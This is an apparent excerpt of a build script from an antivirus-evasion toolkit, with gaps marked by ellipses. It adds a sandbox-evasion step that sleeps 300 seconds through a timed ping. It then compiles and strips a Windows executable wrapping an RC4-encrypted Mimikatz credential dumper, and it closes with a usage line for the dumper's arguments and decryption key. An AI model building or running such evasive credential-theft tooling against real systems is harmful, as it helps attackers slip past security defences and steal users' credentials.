...
#DESCRIPTION_START
# Sleeps for 5 minutes, issuing a timed ping command, attempting to timeout sandboxes.
...
# sleep for 300 seconds by waiting for ping to finish
add_evasion sleep_by_ping 300
...
# compile to exe file
$win64_compiler -o output/sleepbyping_rc4_mimikatz.exe source/avet.c
strip output/sleepbyping_rc4_mimikatz.exe
...
# $ sleepbyping_rc4_mimikatz_win64.exe [your mimikatz arguments, probably 'coffee']  [decryption key]
"
